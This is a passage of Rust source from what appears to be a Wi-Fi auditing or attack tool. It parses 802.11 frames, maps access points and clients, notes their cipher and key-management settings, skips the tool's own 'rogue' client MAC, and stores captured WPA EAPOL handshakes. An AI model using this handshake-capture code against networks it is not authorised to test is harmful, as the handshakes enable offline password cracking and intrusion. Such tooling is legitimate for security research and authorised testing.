                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);
                }
                Frame::AssociationRequest(assoc_request_frame) => {
                    // Assumption:
                    //  Only a client/potential client will ever submit an association request.
                    //
                    let client_mac = assoc_request_frame.header.address_2; // MAC address of the client
                    let bssid = assoc_request_frame.header.address_1; // MAC address of the AP (BSSID)

                    // Handle client as not yet associated
                    if client_mac.is_real_device() && client_mac != self.rogue_client {
                        self.unassoc_clients.add_or_update_device(
                            client_mac.clone(),
                            WiFiDevice::new_unassoc_station(
                                client_mac.clone(),
                                radiotap
                                    .antenna_signal
                                    .unwrap_or(AntennaSignal::from_bytes(&[0u8])?),
                                vec![],
                            ),
                        )
                    };
                    // Add AP
                    if bssid.is_real_device() {
                        let ap = WiFiDevice::new_access_point_with_client(
                            bssid.clone(),
                            AntennaSignal::from_bytes(&[0u8])?,
                            None,
                            vec![],
                            assoc_request_frame.station_info.ds_parameter_set,
                            None,
                        );
                        self.access_points.add_or_update_device(bssid, ap);
                    };
                }
                Frame::AssociationResponse(assoc_response_frame) => {
                    // Assumption:
                    //  Only a AP will ever submit an association response.
                    //
                    let client_mac = assoc_response_frame.header.address_1; // MAC address of the client
                    let bssid = assoc_response_frame.header.address_2; // MAC address of the AP (BSSID)

                    if bssid.is_real_device()
                        && client_mac.is_real_device()
                        && client_mac != self.rogue_client
                    {
                        // Valid devices
                        let mut clients = Vec::new();

                        if assoc_response_frame.status_code != 0 {
                            // Association was successful
                            let client = WiFiDevice::new_station(
                                client_mac.clone(),
                                AntennaSignal::from_bytes(&[0u8])?,
                                Some(assoc_response_frame.association_id),
                                Some(bssid.clone()),
                            );
                            clients.push(client);
                            self.unassoc_clients.remove_device(&client_mac);
                        }
                        let ap = WiFiDevice::new_access_point_with_client(
                            bssid.clone(),
                            radiotap
                                .antenna_signal
                                .unwrap_or(AntennaSignal::from_bytes(&[0u8])?),
                            None,
                            clients,
                            assoc_response_frame.station_info.ds_parameter_set,
                            Some(AccessPointInformation {
                                apie_essid: None,
                                gs_ccmp: if let Some(ref rsn) =
                                    assoc_response_frame.station_info.rsn_information
                                {
                                    if rsn.group_cipher_suite == RsnCipherSuite::CCMP {
                                        Some(true)
                                    } else {
                                        Some(false)
                                    }
                                } else {
                                    None
                                },
                                gs_tkip: if let Some(ref rsn) =
                                    assoc_response_frame.station_info.rsn_information
                                {
                                    if rsn.group_cipher_suite == RsnCipherSuite::TKIP {
                                        Some(true)
                                    } else {
                                        Some(false)
                                    }
                                } else {
                                    None
                                },
                                cs_ccmp: if let Some(ref rsn) =
                                    assoc_response_frame.station_info.rsn_information
                                {
                                    if rsn.pairwise_cipher_suites.contains(&RsnCipherSuite::CCMP) {
                                        Some(true)
                                    } else {
                                        Some(false)
                                    }
                                } else {
                                    None
                                },
                                cs_tkip: if let Some(ref rsn) =
                                    assoc_response_frame.station_info.rsn_information
                                {
                                    if rsn.pairwise_cipher_suites.contains(&RsnCipherSuite::TKIP) {
                                        Some(true)
                                    } else {
                                        Some(false)
                                    }
                                } else {
                                    None
                                },
                                rsn_akm_psk: if let Some(ref rsn) =
                                    assoc_response_frame.station_info.rsn_information
                                {
                                    if rsn.akm_suites.contains(&RsnAkmSuite::PSK) {
                                        Some(true)
                                    } else {
                                        Some(false)
                                    }
                                } else {
                                    None
                                },
                                rsn_akm_psk256: if let Some(ref rsn) =
                                    assoc_response_frame.station_info.rsn_information
                                {
                                    if rsn.akm_suites.contains(&RsnAkmSuite::PSK256) {
                                        Some(true)
                                    } else {
                                        Some(false)
                                    }
                                } else {
                                    None
                                },
                                rsn_akm_pskft: if let Some(ref rsn) =
                                    assoc_response_frame.station_info.rsn_information
                                {
                                    if rsn.akm_suites.contains(&RsnAkmSuite::PSKFT) {
                                        Some(true)
                                    } else {
                                        Some(false)
                                    }
                                } else {
                                    None
                                },
                                wpa_akm_psk: if let Some(wpa) =
                                    assoc_response_frame.station_info.wpa_info
                                {
                                    if wpa.akm_suites.contains(&WpaAkmSuite::Psk) {
                                        Some(true)
                                    } else {
                                        Some(false)
                                    }
                                } else {
                                    None
                                },
                                ap_mfp: if let Some(rsn) =
                                    assoc_response_frame.station_info.rsn_information
                                {
                                    if rsn.mfp_required {
                                        Some(true)
                                    } else {
                                        Some(false)
                                    }
                                } else {
                                    None
                                },
                            }),
                        );
                        self.access_points.add_or_update_device(bssid, ap);
                    };
                }
                Frame::ReassociationRequest(frame) => {
                    // Assumption:
                    //  Only a client will ever submit an reassociation request.
                    //
                    let client_mac = frame.header.address_2; // MAC address of the client
                    let new_ap = frame.header.address_1; // MAC address of the AP (BSSID)
                    let old_ap = frame.current_ap_address;

                    // Technically the client is still associated to the old AP. Let's add it there and we will handle moving it over if we get a reassociation response.
                    if old_ap.is_real_device()
                        && client_mac.is_real_device()
                        && client_mac != self.rogue_client
                    {
                        // Valid devices
                        let mut clients = Vec::new();

                        // Setup client
                        let client = WiFiDevice::new_station(
                            client_mac.clone(),
                            radiotap
                                .antenna_signal
                                .unwrap_or(AntennaSignal::from_bytes(&[0u8])?),
                            None,
                            Some(old_ap.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&client_mac);

                        let ap = WiFiDevice::new_access_point_with_client(
                            old_ap.clone(),
                            AntennaSignal::from_bytes(&[0u8])?,
                            None,
                            clients,
                            frame.station_info.ds_parameter_set,
                            None,
                        );
                        self.access_points.add_or_update_device(old_ap, ap);

                        let newap = WiFiDevice::new_access_point_with_client(
                            new_ap.clone(),
                            AntennaSignal::from_bytes(&[0u8])?,
                            None,
                            Vec::new(),
                            frame.station_info.ds_parameter_set,
                            None,
                        );
                        self.access_points.add_or_update_device(new_ap, newap);
                    };
                }
                Frame::ReassociationResponse(frame) => {
                    // Assumption:
                    //  Only a AP will ever submit a reassociation response.
                    //
                    let client_mac = frame.header.address_1; // MAC address of the client
                    let bssid = frame.header.address_2; // MAC address of the AP (BSSID)

                    if bssid.is_real_device()
                        && client_mac.is_real_device()
                        && client_mac != self.rogue_client
                    {
                        // Valid devices
                        let mut clients = Vec::new();

                        if frame.status_code != 0 {
                            // Association was successful
                            let client = WiFiDevice::new_station(
                                client_mac.clone(),
                                AntennaSignal::from_bytes(&[0u8])?,
                                Some(frame.association_id),
                                Some(bssid.clone()),
                            );
                            clients.push(client);
                            self.unassoc_clients.remove_device(&client_mac);
                            // Find the old AP, remove this device from it.
                            if let Some(old_ap) =
                                self.access_points.find_ap_by_client_mac(&client_mac)
                            {
                                if let WiFiDeviceType::AccessPoint(mut ap_data) =
                                    old_ap.device_type.clone()
                                {
                                    ap_data.client_list.remove_device(&client_mac);
                                }
                            }
                        }
                        let ap = WiFiDevice::new_access_point_with_client(
                            bssid.clone(),
                            radiotap
                                .antenna_signal
                                .unwrap_or(AntennaSignal::from_bytes(&[0u8])?),
                            None,
                            clients,
                            None,
                            None,
                        );
                        self.access_points.add_or_update_device(bssid, ap);
                    };
                }
                Frame::Rts(frame) => {
                    // println!("RTS: {} => {}", frame.source, frame.destination); */
                    let source_mac = frame.source; // MAC address of the source
                    let dest_mac = frame.destination; // MAC address of the destination
                    let from_ds: bool = frame.frame_control.from_ds();
                    let to_ds: bool = frame.frame_control.to_ds();

                    // Figure out our AP and Client using from_ds / to_ds
                    let ap_addr = if from_ds && !to_ds {
                        source_mac.clone()
                    } else if !from_ds && to_ds {
                        dest_mac.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };
                    let station_addr = if !from_ds && to_ds {
                        source_mac.clone()
                    } else {
                        dest_mac.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);
                }
                Frame::Cts(_) => {
                    /* println!("CTS: => {}", frame.destination);
                    let dest_mac = frame.destination; */
                    // Not really doing anything with these yet...
                }
                Frame::Ack(_) => {
                    /* println!("Ack: => {}", frame.destination);
                    let dest_mac = frame.destination;
                    let from_ds: bool = frame.frame_control.from_ds();
                    let to_ds: bool = frame.frame_control.to_ds(); */

                    // Not really doing anything with these yet...
                }
                Frame::BlockAck(frame) => {
                    //println!("BlockAck: {} => {}", frame.source, frame.destination);
                    let source_mac = frame.source; // MAC address of the source
                    let dest_mac = frame.destination; // MAC address of the destination
                    let from_ds: bool = frame.frame_control.from_ds();
                    let to_ds: bool = frame.frame_control.to_ds();

                    // Figure out our AP and Client using from_ds / to_ds
                    let ap_addr = if from_ds && !to_ds {
                        source_mac.clone()
                    } else if !from_ds && to_ds {
                        dest_mac.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };
                    let station_addr = if !from_ds && to_ds {
                        source_mac.clone()
                    } else {
                        dest_mac.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);
                }
                Frame::BlockAckRequest(frame) => {
                    //println!("BlockAckRequest: {} => {}", frame.source, frame.destination);
                    let source_mac = frame.source; // MAC address of the source
                    let dest_mac = frame.destination; // MAC address of the destination
                    let from_ds: bool = frame.frame_control.from_ds();
                    let to_ds: bool = frame.frame_control.to_ds();

                    // Figure out our AP and Client using from_ds / to_ds
                    let ap_addr = if from_ds && !to_ds {
                        source_mac.clone()
                    } else if !from_ds && to_ds {
                        dest_mac.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };
                    let station_addr = if !from_ds && to_ds {
                        source_mac.clone()
                    } else {
                        dest_mac.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);
                }
                Frame::Data(data_frame) => {
                    let source = data_frame.src().expect("Unable to get src");
                    let dest = data_frame.dest();
                    let from_ds: bool = data_frame.header.frame_control.from_ds();
                    let to_ds: bool = data_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        data_frame.header.address_2.clone()
                    } else if !from_ds && to_ds {
                        data_frame.header.address_1.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        data_frame.header.address_2.clone()
                    } else {
                        data_frame.header.address_1.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);

                    if let Some(mut eapol) = data_frame.eapol_key.clone() {
                        self.eapol_count += 1;
                        let essid: Option<String> =
                            if let Some(ap) = self.access_points.get_device(&ap_addr) {
                                if let WiFiDeviceType::AccessPoint(ap_data) = &ap.device_type {
                                    ap_data.ssid.clone()
                                } else {
                                    None
                                }
                            } else {
                                None
                            };

                        let result = self.handshake_storage.add_or_update_handshake(
                            &ap_addr,
                            &station_addr,
                            eapol.clone(),
                            essid,
                        );
                        match result {
                            Ok(_) => {
                                self.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!(
                                        "New Eapol: {source} => {dest} ({})",
                                        eapol.determine_key_type()
                                    ),
                                ));
                            }
                            Err(e) => {
                                self.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!(
                                        "Eapol Failed to Add: {source} => {dest} ({}) | {e}",
                                        eapol.determine_key_type(),
                                    ),
                                ));
                            }
                        }
                    }
                }
                Frame::NullData(data_frame) => {
                    let from_ds: bool = data_frame.header.frame_control.from_ds();
                    let to_ds: bool = data_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        data_frame.header.address_2.clone()
                    } else if !from_ds && to_ds {
                        data_frame.header.address_1.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        data_frame.header.address_2.clone()
                    } else {
                        data_frame.header.address_1.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);
                }
                Frame::QosNull(data_frame) => {
                    let from_ds: bool = data_frame.header.frame_control.from_ds();
                    let to_ds: bool = data_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        data_frame.header.address_2.clone()
                    } else if !from_ds && to_ds {
                        data_frame.header.address_1.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        data_frame.header.address_2.clone()
                    } else {
                        data_frame.header.address_1.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);
                }
                Frame::QosData(data_frame) => {
                    let source = data_frame.src().expect("Unable to get src");
                    let dest = data_frame.dest();
                    let from_ds: bool = data_frame.header.frame_control.from_ds();
                    let to_ds: bool = data_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        data_frame.header.address_2.clone()
                    } else if !from_ds && to_ds {
                        data_frame.header.address_1.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        data_frame.header.address_2.clone()
                    } else {
                        data_frame.header.address_1.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);

                    if let Some(mut eapol) = data_frame.eapol_key.clone() {
                        self.eapol_count += 1;
                        let essid: Option<String> =
                            if let Some(ap) = self.access_points.get_device(&ap_addr) {
                                if let WiFiDeviceType::AccessPoint(ap_data) = &ap.device_type {
                                    ap_data.ssid.clone()
                                } else {
                                    None
                                }
                            } else {
                                None
                            };

                        let result = self.handshake_storage.add_or_update_handshake(
                            &ap_addr,
                            &station_addr,
                            eapol.clone(),
                            essid,
                        );
                        match result {
                            Ok(_) => {
                                self.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!(
                                        "New Eapol: {source} => {dest} ({})",
                                        eapol.determine_key_type()
                                    ),
                                ));
                            }
                            Err(e) => {
                                self.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!(
                                        "Eapol Failed to Add: {source} => {dest} ({}) | {e}",
                                        eapol.determine_key_type(),
                                    ),
                                ));
                            }
                        }
                    }
                }
                Frame::DataCfAck(data_frame) => {
                    let source = data_frame.src().expect("Unable to get src");
                    let dest = data_frame.dest();
                    let from_ds: bool = data_frame.header.frame_control.from_ds();
                    let to_ds: bool = data_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        data_frame.header.address_2.clone()
                    } else if !from_ds && to_ds {
                        data_frame.header.address_1.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        data_frame.header.address_2.clone()
                    } else {
                        data_frame.header.address_1.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);

                    if let Some(mut eapol) = data_frame.eapol_key.clone() {
                        self.eapol_count += 1;
                        let essid: Option<String> =
                            if let Some(ap) = self.access_points.get_device(&ap_addr) {
                                if let WiFiDeviceType::AccessPoint(ap_data) = &ap.device_type {
                                    ap_data.ssid.clone()
                                } else {
                                    None
                                }
                            } else {
                                None
                            };

                        let result = self.handshake_storage.add_or_update_handshake(
                            &ap_addr,
                            &station_addr,
                            eapol.clone(),
                            essid,
                        );
                        match result {
                            Ok(_) => {
                                self.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!(
                                        "New Eapol: {source} => {dest} ({})",
                                        eapol.determine_key_type()
                                    ),
                                ));
                            }
                            Err(e) => {
                                self.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!(
                                        "Eapol Failed to Add: {source} => {dest} ({}) | {e}",
                                        eapol.determine_key_type(),
                                    ),
                                ));
                            }
                        }
                    }
                }
                Frame::DataCfPoll(data_frame) => {
                    let source = data_frame.src().expect("Unable to get src");
                    let dest = data_frame.dest();
                    let from_ds: bool = data_frame.header.frame_control.from_ds();
                    let to_ds: bool = data_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        data_frame.header.address_2.clone()
                    } else if !from_ds && to_ds {
                        data_frame.header.address_1.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        data_frame.header.address_2.clone()
                    } else {
                        data_frame.header.address_1.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);

                    if let Some(mut eapol) = data_frame.eapol_key.clone() {
                        self.eapol_count += 1;
                        let essid: Option<String> =
                            if let Some(ap) = self.access_points.get_device(&ap_addr) {
                                if let WiFiDeviceType::AccessPoint(ap_data) = &ap.device_type {
                                    ap_data.ssid.clone()
                                } else {
                                    None
                                }
                            } else {
                                None
                            };

                        let result = self.handshake_storage.add_or_update_handshake(
                            &ap_addr,
                            &station_addr,
                            eapol.clone(),
                            essid,
                        );
                        match result {
                            Ok(_) => {
                                self.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!(
                                        "New Eapol: {source} => {dest} ({})",
                                        eapol.determine_key_type()
                                    ),
                                ));
                            }
                            Err(e) => {
                                self.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!(
                                        "Eapol Failed to Add: {source} => {dest} ({}) | {e}",
                                        eapol.determine_key_type(),
                                    ),
                                ));
                            }
                        }
                    }
                }
                Frame::DataCfAckCfPoll(data_frame) => {
                    let source = data_frame.src().expect("Unable to get src");
                    let dest = data_frame.dest();
                    let from_ds: bool = data_frame.header.frame_control.from_ds();
                    let to_ds: bool = data_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        data_frame.header.address_2.clone()
                    } else if !from_ds && to_ds {
                        data_frame.header.address_1.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        data_frame.header.address_2.clone()
                    } else {
                        data_frame.header.address_1.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);

                    if let Some(mut eapol) = data_frame.eapol_key.clone() {
                        self.eapol_count += 1;
                        let essid: Option<String> =
                            if let Some(ap) = self.access_points.get_device(&ap_addr) {
                                if let WiFiDeviceType::AccessPoint(ap_data) = &ap.device_type {
                                    ap_data.ssid.clone()
                                } else {
                                    None
                                }
                            } else {
                                None
                            };

                        let result = self.handshake_storage.add_or_update_handshake(
                            &ap_addr,
                            &station_addr,
                            eapol.clone(),
                            essid,
                        );
                        match result {
                            Ok(_) => {
                                self.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!(
                                        "New Eapol: {source} => {dest} ({})",
                                        eapol.determine_key_type()
                                    ),
                                ));
                            }
                            Err(e) => {
                                self.status_log.add_message(StatusMessage::new(
                                    MessageType::Info,
                                    format!(
                                        "Eapol Failed to Add: {source} => {dest} ({}) | {e}",
                                        eapol.determine_key_type(),
                                    ),
                                ));
                            }
                        }
                    }
                }
                Frame::CfAck(data_frame) => {
                    let from_ds: bool = data_frame.header.frame_control.from_ds();
                    let to_ds: bool = data_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        data_frame.header.address_2.clone()
                    } else if !from_ds && to_ds {
                        data_frame.header.address_1.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        data_frame.header.address_2.clone()
                    } else {
                        data_frame.header.address_1.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);
                }
                Frame::CfPoll(data_frame) => {
                    let from_ds: bool = data_frame.header.frame_control.from_ds();
                    let to_ds: bool = data_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        data_frame.header.address_2.clone()
                    } else if !from_ds && to_ds {
                        data_frame.header.address_1.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
                        data_frame.header.address_2.clone()
                    } else {
                        data_frame.header.address_1.clone()
                    };

                    let mut clients = Vec::new(); // Clients list for AP.
                    let signal = radiotap
                        .antenna_signal
                        .unwrap_or(AntennaSignal::from_bytes(&[0u8])?);

                    if station_addr.is_real_device() && station_addr != self.rogue_client {
                        // Make sure this isn't a broadcast or something

                        let client = WiFiDevice::new_station(
                            station_addr.clone(),
                            if to_ds {
                                signal
                            } else {
                                AntennaSignal::from_bytes(&[0u8])?
                            },
                            None,
                            Some(ap_addr.clone()),
                        );
                        clients.push(client);
                        self.unassoc_clients.remove_device(&station_addr);
                    }
                    let ap = WiFiDevice::new_access_point_with_client(
                        ap_addr.clone(),
                        if from_ds {
                            signal
                        } else {
                            AntennaSignal::from_bytes(&[0u8])?
                        },
                        None,
                        clients,
                        None,
                        None,
                    );
                    self.access_points.add_or_update_device(ap_addr.clone(), ap);
                }
                Frame::CfAckCfPoll(data_frame) => {
                    let from_ds: bool = data_frame.header.frame_control.from_ds();
                    let to_ds: bool = data_frame.header.frame_control.to_ds();
                    let ap_addr = if from_ds && !to_ds {
                        data_frame.header.address_2.clone()
                    } else if !from_ds && to_ds {
                        data_frame.header.address_1.clone()
                    } else {
                        // this is part of a WDS (mesh/bridging) or ADHOC (IBSS) network
                        // lets just ignore it lol
                        return Ok(());
                    };

                    let station_addr = if !from_ds && to_ds {
